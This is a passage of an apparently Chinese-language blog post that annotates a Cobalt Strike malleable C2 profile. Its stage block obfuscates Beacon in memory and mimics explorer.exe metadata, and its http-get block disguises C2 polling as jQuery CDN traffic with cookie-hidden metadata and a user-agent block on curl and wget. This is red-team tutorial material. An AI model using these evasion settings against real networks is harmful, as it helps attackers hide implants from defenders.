+</span></span><span class="line"><span class="cl"><span class="err">##</span>       <span class="err">https:</span><span class="c1">//blog.cobaltstrike.com/2018/02/08/in-memory-evasion/
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">##</span>       <span class="err">https:</span><span class="c1">//www.youtube.com/playlist?list=PL9HO6M_MU2nc5Q31qd2CwpZ8J4KFMhgnK
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">##</span>       <span class="err">https:</span><span class="c1">//www.youtube.com/watch?v=AV4XjxYe4GM (Obfuscate and Sleep)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">stage</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">CS</span> <span class="err">4.2</span> <span class="err">added</span> <span class="err">allocator</span> <span class="err">and</span> <span class="err">MZ</span> <span class="err">header</span> <span class="err">overrides</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">allocator</span>      <span class="nt">&#34;VirtualAlloc&#34;</span><span class="err">;</span> <span class="err">#</span> <span class="err">Options</span> <span class="err">are</span><span class="p">:</span> <span class="err">HeapAlloc</span><span class="p">,</span> <span class="err">MapViewOfFile,</span> <span class="err">and</span> <span class="err">VirtualAlloc</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#set</span> <span class="err">magic_mz_x86</span>   <span class="nt">&#34;MZRE&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#set</span> <span class="err">magic_mz_x</span><span class="mi">64</span>   <span class="s2">&#34;MZAR&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">magic_pe</span>       <span class="s2">&#34;NO&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">userwx</span>         <span class="s2">&#34;false&#34;</span><span class="err">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">stomppe</span>        <span class="s2">&#34;true&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">obfuscate</span>      <span class="s2">&#34;true&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">cleanup</span>        <span class="s2">&#34;true&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">CS</span> <span class="mf">3.12</span> <span class="err">Addition</span> <span class="s2">&#34;Obfuscate and Sleep&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">sleep_mask</span>     <span class="s2">&#34;true&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">CS</span> <span class="mf">4.1</span>  
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">smartinject</span>    <span class="s2">&#34;true&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">Make</span> <span class="err">the</span> <span class="err">Beacon</span> <span class="err">Reflective</span> <span class="err">DLL</span> <span class="err">look</span> <span class="err">like</span> <span class="err">something</span> <span class="err">else</span> <span class="err">in</span> <span class="err">memory</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">Values</span> <span class="err">captured</span> <span class="err">using</span> <span class="err">peclone</span> <span class="err">agaist</span> <span class="err">a</span> <span class="err">Windows</span> <span class="mi">10</span> <span class="err">version</span> <span class="err">of</span> <span class="err">explorer.exe</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">checksum</span>       <span class="s2">&#34;0&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">compile_time</span>   <span class="s2">&#34;11 Nov 2016 04:08:32&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">entry_point</span>    <span class="s2">&#34;650688&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">image_size_x</span><span class="mi">86</span> <span class="s2">&#34;4661248&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">image_size_x</span><span class="mi">64</span> <span class="s2">&#34;4661248&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">name</span>           <span class="s2">&#34;srv.dll&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">rich_header</span>    <span class="s2">&#34;\x3e\x98\xfe\x75\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x73\x81\x03\x26\xfc\xf9\x90\x26\x17\xa4\x93\x27\x79\xf9\x90\x26\x7a\xf9\x91\x26\x83\xfd\x90\x26\x17\xa4\x91\x27\x65\xf9\x90\x26\x17\xa4\x95\x27\x77\xf9\x90\x26\x17\xa4\x94\x27\x6c\xf9\x90\x26\x17\xa4\x9e\x27\x56\xf8\x90\x26\x17\xa4\x6f\x26\x7b\xf9\x90\x26\x17\xa4\x92\x27\x7b\xf9\x90\x26\x52\x69\x63\x68\x7a\xf9\x90\x26\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">##</span> <span class="err">WARNING</span><span class="p">:</span> <span class="err">Module</span> <span class="err">stomping</span> 
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">Cobalt</span> <span class="err">Strike</span> <span class="mf">3.11</span> <span class="err">also</span> <span class="err">adds</span> <span class="err">module</span> <span class="err">stomping</span> <span class="err">to</span> <span class="err">Beacon&#39;s</span> <span class="err">Reflective</span> <span class="err">Loader.</span> <span class="err">When</span> <span class="err">enabled</span><span class="p">,</span> <span class="err">Beacon&#39;s</span> <span class="err">loader</span> <span class="err">will</span> <span class="err">shun</span> <span class="err">VirtualAlloc</span> <span class="err">and</span> <span class="err">instead</span> <span class="err">load</span> <span class="err">a</span> <span class="err">DLL</span> <span class="err">into</span> <span class="err">the</span> <span class="err">current</span> <span class="err">process</span> <span class="err">and</span> <span class="err">overwrite</span> <span class="err">its</span> <span class="err">memory.</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">Set</span> <span class="err">module_x86</span> <span class="err">to</span> <span class="err">a</span> <span class="err">favorite</span> <span class="err">x86</span> <span class="err">DLL</span> <span class="err">to</span> <span class="err">module</span> <span class="err">stomp</span> <span class="err">with</span> <span class="err">the</span> <span class="err">x86</span> <span class="err">Beacon.</span> <span class="err">The</span> <span class="err">module_x64</span> <span class="err">option</span> <span class="err">enables</span> <span class="err">this</span> <span class="err">for</span> <span class="err">the</span> <span class="err">x64</span> <span class="err">Beacon.</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">While</span> <span class="err">this</span> <span class="err">is</span> <span class="err">a</span> <span class="err">powerful</span> <span class="err">feature,</span> <span class="err">caveats</span> <span class="err">apply!</span> <span class="err">If</span> <span class="err">the</span> <span class="err">library</span> <span class="err">you</span> <span class="err">load</span> <span class="err">is</span> <span class="err">not</span> <span class="err">large</span> <span class="err">enough</span> <span class="err">to</span> <span class="err">host</span> <span class="err">Beacon,</span> <span class="err">you</span> <span class="err">will</span> <span class="err">crash</span> <span class="err">Beacon&#39;s</span> <span class="err">process.</span> <span class="err">If</span> <span class="err">the</span> <span class="err">current</span> <span class="err">process</span> <span class="err">loads</span> <span class="err">the</span> <span class="err">same</span> <span class="err">library</span> <span class="err">later</span> <span class="err">(for</span> <span class="err">whatever</span> <span class="err">reason),</span> <span class="err">you</span> <span class="err">will</span> <span class="err">crash</span> <span class="err">Beacon&#39;s</span> <span class="err">process.</span> <span class="err">Choose</span> <span class="err">carefully.</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">By</span> <span class="err">default,</span> <span class="err">Beacon&#39;s</span> <span class="err">loader</span> <span class="err">allocates</span> <span class="err">memory</span> <span class="err">with</span> <span class="err">VirtualAlloc.</span> <span class="err">Module</span> <span class="err">stomping</span> <span class="err">is</span> <span class="err">an</span> <span class="err">alternative</span> <span class="err">to</span> <span class="err">this.</span> <span class="err">Set</span> <span class="err">module_x86</span> <span class="err">to</span> <span class="err">a</span> <span class="err">DLL</span> <span class="err">that</span> <span class="err">is</span> <span class="err">about</span> <span class="err">twice</span> <span class="err">as</span> <span class="err">large</span> <span class="err">as</span> <span class="err">the</span> <span class="err">Beacon</span> <span class="err">payload</span> <span class="err">itself.</span> <span class="err">Beacon&#39;s</span> <span class="err">x86</span> <span class="err">loader</span> <span class="err">will</span> <span class="err">load</span> <span class="err">the</span> <span class="err">specified</span> <span class="err">DLL,</span> <span class="err">find</span> <span class="err">its</span> <span class="err">location</span> <span class="err">in</span> <span class="err">memory,</span> <span class="err">and</span> <span class="err">overwrite</span> <span class="err">it.</span> <span class="err">This</span> <span class="err">is</span> <span class="err">a</span> <span class="err">way</span> <span class="err">to</span> <span class="err">situate</span> <span class="err">Beacon</span> <span class="err">in</span> <span class="err">memory</span> <span class="err">that</span> <span class="err">Windows</span> <span class="err">associates</span> <span class="err">with</span> <span class="err">a</span> <span class="err">file</span> <span class="err">on</span> <span class="err">disk.</span> <span class="err">It&#39;s</span> <span class="err">important</span> <span class="err">that</span> <span class="err">the</span> <span class="err">DLL</span> <span class="err">you</span> <span class="err">choose</span> <span class="err">is</span> <span class="err">not</span> <span class="err">needed</span> <span class="err">by</span> <span class="err">the</span> <span class="err">applications</span> <span class="err">you</span> <span class="err">intend</span> <span class="err">to</span> <span class="err">reside</span> <span class="err">in.</span> <span class="err">The</span> <span class="err">module_x64</span> <span class="err">option</span> <span class="err">is</span> <span class="err">the</span> <span class="err">same</span> <span class="err">story,</span> <span class="err">but</span> <span class="err">it</span> <span class="err">affects</span> <span class="err">the</span> <span class="err">x64</span> <span class="err">Beacon.</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">Details</span> <span class="err">can</span> <span class="err">be</span> <span class="err">found</span> <span class="err">in</span> <span class="err">the</span> <span class="err">In-memory</span> <span class="err">Evasion</span> <span class="err">video</span> <span class="err">series.</span> <span class="err">https:</span><span class="c1">//youtu.be/uWVH9l2GMw4
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">set</span> <span class="err">module_x64</span> <span class="nt">&#34;netshell.dll&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">set</span> <span class="err">module_x</span><span class="mi">86</span> <span class="s2">&#34;netshell.dll&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">CS</span> <span class="mf">4.8</span> <span class="err">-</span> <span class="err">Added</span> <span class="err">default</span> <span class="err">syscall</span> <span class="err">method</span> <span class="err">option.</span> <span class="err">This</span> <span class="err">option</span> <span class="err">supports</span><span class="p">:</span> <span class="err">None</span><span class="p">,</span> <span class="err">Direct,</span> <span class="err">and</span> <span class="err">Indirect.</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">syscall_method</span> <span class="nt">&#34;None&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">The</span> <span class="err">transform-x</span><span class="mi">86</span> <span class="err">and</span> <span class="err">transform-x</span><span class="mi">64</span> <span class="err">blocks</span> <span class="err">pad</span> <span class="err">and</span> <span class="err">transform</span> <span class="err">Beacon&#39;s</span> <span class="err">Reflective</span> <span class="err">DLL</span> <span class="err">stage.</span> <span class="err">These</span> <span class="err">blocks</span> <span class="err">support</span> <span class="err">three</span> <span class="err">commands</span><span class="p">:</span> <span class="err">prepend</span><span class="p">,</span> <span class="err">append,</span> <span class="err">and</span> <span class="err">strrep.</span>
+</span></span><span class="line"><span class="cl">    <span class="err">transform-x86</span> <span class="err">{</span> <span class="err">#</span> <span class="err">transform</span> <span class="err">the</span> <span class="err">x86</span> <span class="err">rDLL</span> <span class="err">stage</span>
+</span></span><span class="line"><span class="cl">        <span class="err">prepend</span> <span class="nt">&#34;\x90\x90\x90\x90\x90\x90\x90\x90\x90&#34;</span><span class="err">;</span> <span class="err">#</span> <span class="err">prepend</span> <span class="err">nops</span>
+</span></span><span class="line"><span class="cl">        <span class="err">strrep</span> <span class="s2">&#34;ReflectiveLoader&#34;</span> <span class="s2">&#34;execute&#34;</span><span class="err">;</span> <span class="err">#</span> <span class="err">Change</span> <span class="err">this</span> <span class="err">text</span>
+</span></span><span class="line"><span class="cl">        <span class="err">strrep</span> <span class="s2">&#34;This program cannot be run in DOS mode&#34;</span> <span class="s2">&#34;&#34;</span><span class="err">;</span> <span class="err">#</span> <span class="err">Remove</span> <span class="err">this</span> <span class="err">text</span>
+</span></span><span class="line"><span class="cl">        <span class="err">strrep</span> <span class="s2">&#34;beacon.dll&#34;</span> <span class="s2">&#34;&#34;</span><span class="err">;</span> <span class="err">#</span> <span class="err">Remove</span> <span class="err">this</span> <span class="err">text</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="err">transform-x</span><span class="mi">64</span> <span class="p">{</span> <span class="err">#</span> <span class="err">transform</span> <span class="err">the</span> <span class="err">x64</span> <span class="err">rDLL</span> <span class="err">stage</span>
+</span></span><span class="line"><span class="cl">        <span class="err">prepend</span> <span class="nt">&#34;\x90\x90\x90\x90\x90\x90\x90\x90\x90&#34;</span><span class="err">;</span> <span class="err">#</span> <span class="err">prepend</span> <span class="err">nops</span>
+</span></span><span class="line"><span class="cl">        <span class="err">strrep</span> <span class="s2">&#34;ReflectiveLoader&#34;</span> <span class="s2">&#34;execute&#34;</span><span class="err">;</span> <span class="err">#</span> <span class="err">Change</span> <span class="err">this</span> <span class="err">text</span> <span class="err">in</span> <span class="err">the</span> <span class="err">Beacon</span> <span class="err">DLL</span>
+</span></span><span class="line"><span class="cl">        <span class="err">strrep</span> <span class="s2">&#34;beacon.x64.dll&#34;</span> <span class="s2">&#34;&#34;</span><span class="err">;</span> <span class="err">#</span> <span class="err">Remove</span> <span class="err">this</span> <span class="err">text</span> <span class="err">in</span> <span class="err">the</span> <span class="err">Beacon</span> <span class="err">DLL</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">stringw</span> <span class="s2">&#34;jQuery&#34;</span><span class="err">;</span> <span class="err">#</span> <span class="err">Add</span> <span class="err">this</span> <span class="err">string</span> <span class="err">to</span> <span class="err">the</span> <span class="err">DLL</span>
+</span></span><span class="line"><span class="cl"><span class="err">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>控制beacon如何加载到内存中，以及如何进行dll反射。</p>
+<h3 id="http-headers">HTTP Headers</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">HTTP</span> <span class="err">Headers</span>
+</span></span><span class="line"><span class="cl"><span class="err">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Description:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">The</span> <span class="err">http-config</span> <span class="err">block</span> <span class="err">has</span> <span class="err">influence</span> <span class="err">over</span> <span class="err">all</span> <span class="err">HTTP</span> <span class="err">responses</span> <span class="err">served</span> <span class="err">by</span> <span class="err">Cobalt</span> <span class="err">Strike’s</span> <span class="err">web</span> <span class="err">server.</span> <span class="err">Here,</span> <span class="err">you</span> <span class="err">may</span> <span class="err">specify</span> <span class="err">additional</span> <span class="err">HTTP</span> <span class="err">headers</span> <span class="err">and</span> <span class="err">the</span> <span class="err">HTTP</span> <span class="err">header</span> <span class="err">order.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Values:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">set</span> <span class="err">headers</span>                   <span class="s2">&#34;Comma separated list of headers&#34;</span>    <span class="err">The</span> <span class="err">set</span> <span class="err">headers</span> <span class="err">option</span> <span class="err">specifies</span> <span class="err">the</span> <span class="err">order</span> <span class="err">these</span> <span class="err">HTTP</span> <span class="err">headers</span> <span class="err">are</span> <span class="err">delivered</span> <span class="err">in</span> <span class="err">an</span> <span class="err">HTTP</span> <span class="err">response.</span> <span class="err">Any</span> <span class="err">headers</span> <span class="err">not</span> <span class="err">in</span> <span class="err">this</span> <span class="err">list</span> <span class="err">are</span> <span class="err">added</span> <span class="err">to</span> <span class="err">the</span> <span class="err">end.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">header</span>                        <span class="s2">&#34;headername&#34;</span> <span class="s2">&#34;header alue            The header keyword adds a header value to each of Cobalt Strike&#39;s HTTP responses. If the header value is already defined in a response, this value is ignored.
+</span></span></span><span class="line"><span class="cl"><span class="s2">##    set trust_x_forwarded_for     &#34;</span><span class="kc">true</span><span class="s2">&#34;                               Adds this header to determine remote address of a request.
+</span></span></span><span class="line"><span class="cl"><span class="s2">##    block_useragents              &#34;</span><span class="err">curl*,lynx*,wget*</span><span class="s2">&#34;                  Default useragents that are blocked
+</span></span></span><span class="line"><span class="cl"><span class="s2">## Guidelines:
+</span></span></span><span class="line"><span class="cl"><span class="s2">##    - Use this section in addition to the &#34;</span><span class="err">server</span><span class="s2">&#34; secion in http-get and http-post to further define the HTTP headers 
+</span></span></span><span class="line"><span class="cl"><span class="s2">http-config {
+</span></span></span><span class="line"><span class="cl"><span class="s2">    set headers &#34;</span><span class="err">Date,</span> <span class="err">Server,</span> <span class="err">Content-Length,</span> <span class="err">Keep-Alive,</span> <span class="err">Connection,</span> <span class="err">Content-Type</span><span class="s2">&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    header &#34;</span><span class="err">Server</span><span class="s2">&#34; &#34;</span><span class="err">Apache</span><span class="s2">&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    header &#34;</span><span class="err">Keep-Alive</span><span class="s2">&#34; &#34;</span><span class="err">timeout=</span><span class="mi">10</span><span class="err">,</span> <span class="err">max=</span><span class="mi">100</span><span class="s2">&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    header &#34;</span><span class="err">Connection</span><span class="s2">&#34; &#34;</span><span class="err">Keep-Alive</span><span class="s2">&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    # Use this option if your teamserver is behind a redirector
+</span></span></span><span class="line"><span class="cl"><span class="s2">    set trust_x_forwarded_for &#34;</span><span class="kc">true</span><span class="s2">&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    # Block Specific User Agents with a 404 (added in 4.3)
+</span></span></span><span class="line"><span class="cl"><span class="s2">    set block_useragents &#34;</span><span class="err">curl*,lynx*,wget*&#34;;</span>
+</span></span><span class="line"><span class="cl"><span class="err">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>http-config块控制了CS的web服务器的全局的http响应的相关设置，可以在这里自定义响应包的header的相关内容。</p>
+<h3 id="http-get">HTTP GET</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">HTTP</span> <span class="err">GET</span>
+</span></span><span class="line"><span class="cl"><span class="err">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Description:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">GET</span> <span class="err">is</span> <span class="err">used</span> <span class="err">to</span> <span class="err">poll</span> <span class="err">teamserver</span> <span class="err">for</span> <span class="err">tasks</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Defaults:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">uri</span> <span class="s2">&#34;/activity&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">Headers</span> <span class="err">(Sample)</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>      <span class="err">Accept:</span> <span class="err">*/*</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>      <span class="err">Cookie:</span> <span class="err">CN</span><span class="mi">7</span><span class="err">uVizbjdUdzNShKoHQc</span><span class="mi">1</span><span class="err">HdhBsB</span><span class="mi">0</span><span class="err">XMCbWJGIRF</span><span class="mi">27</span><span class="err">eYLDqc</span><span class="mi">9</span><span class="err">Tnb</span><span class="mi">220</span><span class="err">an</span><span class="mi">8</span><span class="err">ZgFcFMXLARTWEGgsvWsAYe+bsf</span><span class="mi">67</span><span class="err">HyISXgvTUpVJRSZeRYkhOTgr</span><span class="mi">31</span><span class="err">/</span><span class="mi">5</span><span class="err">xHiittfuu</span><span class="mi">1</span><span class="err">QwcKdXopIE+yP</span><span class="mi">8</span><span class="err">QmpyRq</span><span class="mi">3</span><span class="err">DgsRB</span><span class="mi">45</span><span class="err">PFEGcidrQn</span><span class="mi">3</span><span class="err">/aK</span><span class="mi">0</span><span class="err">MnXoM=</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>      <span class="err">User-Agent</span> <span class="err">Mozilla/</span><span class="mf">4.0</span> <span class="err">(compatible;</span> <span class="err">MSIE</span> <span class="mf">8.0</span><span class="err">;</span> <span class="err">Windows</span> <span class="err">NT</span> <span class="mf">5.1</span><span class="err">;</span> <span class="err">Trident/</span><span class="mf">4.0</span><span class="err">;</span> <span class="err">SV</span><span class="mi">1</span><span class="err">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Guidelines:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">Add</span> <span class="err">customize</span> <span class="err">HTTP</span> <span class="err">headers</span> <span class="err">to</span> <span class="err">the</span> <span class="err">HTTP</span> <span class="err">traffic</span> <span class="err">of</span> <span class="err">your</span> <span class="err">campaign</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">Analyze</span> <span class="err">sample</span> <span class="err">HTTP</span> <span class="err">traffic</span> <span class="err">to</span> <span class="err">use</span> <span class="err">as</span> <span class="err">a</span> <span class="err">reference</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">Multiple</span> <span class="err">URIs</span> <span class="err">can</span> <span class="err">be</span> <span class="err">added.</span> <span class="err">Beacon</span> <span class="err">will</span> <span class="err">randomly</span> <span class="err">pick</span> <span class="err">from</span> <span class="err">these.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>      <span class="err">-</span> <span class="err">Use</span> <span class="err">spaces</span> <span class="err">as</span> <span class="err">a</span> <span class="err">URI</span> <span class="err">seperator</span>
+</span></span><span class="line"><span class="cl"><span class="err">http-get</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">uri</span> <span class="nt">&#34;/jquery-3.3.1.min.js&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">verb</span> <span class="s2">&#34;GET&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">client</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="nt">&#34;Accept&#34;</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="s2">&#34;Host&#34;</span> <span class="s2">&#34;code.jquery.com&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="s2">&#34;Referer&#34;</span> <span class="s2">&#34;http://code.jquery.com/&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="s2">&#34;Accept-Encoding&#34;</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">				<span class="err">#</span> <span class="err">元数据放在cookie头中，并进行base</span><span class="mi">64</span><span class="err">url编码</span>
+</span></span><span class="line"><span class="cl">        <span class="err">metadata</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="err">base64url;</span>
+</span></span><span class="line"><span class="cl">            <span class="err">prepend</span> <span class="nt">&#34;__cfduid=&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">            <span class="err">header</span> <span class="s2">&#34;Cookie&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">server</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="err">#</span> <span class="err">如果teamserver有任务，则会在http</span> <span class="err">body部分回传给client。</span>
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="nt">&#34;Server&#34;</span> <span class="s2">&#34;NetDNA-cache/2.2&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="s2">&#34;Cache-Control&#34;</span> <span class="s2">&#34;max-age=0, no-cache&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="s2">&#34;Pragma&#34;</span> <span class="s2">&#34;no-cache&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="s2">&#34;Connection&#34;</span> <span class="s2">&#34;keep-alive&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="s2">&#34;Content-Type&#34;</span> <span class="s2">&#34;application/javascript; charset=utf-8&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="err">output</span> <span class="p">{</span>   
+</span></span><span class="line"><span class="cl">            <span class="err">mask;</span>
+</span></span><span class="line"><span class="cl">            <span class="err">base64url;</span>
+</span></span><span class="line"><span class="cl">            <span class="err">##</span> <span class="err">The</span> <span class="err">javascript</span> <span class="err">was</span> <span class="err">changed.</span>  <span class="err">Double</span> <span class="err">quotes</span> <span class="err">and</span> <span class="err">backslashes</span> <span class="err">were</span> <span class="err">escaped</span> <span class="err">to</span> <span class="err">properly</span> <span class="err">render</span> <span class="err">(Refer</span> <span class="err">to</span> <span class="err">Tips</span> <span class="err">for</span> <span class="err">Profile</span> <span class="err">Parameter</span> <span class="err">Values)</span>
+</span></span><span class="line"><span class="cl">            <span class="err">#</span> <span class="err">2nd</span> <span class="err">Line</span>            
+</span></span><span class="line"><span class="cl">            <span class="err">prepend</span> <span class="nt">&#34;!function(e,t)...省略...P=\&#34;\r&#34;</span><span class="err">;</span>
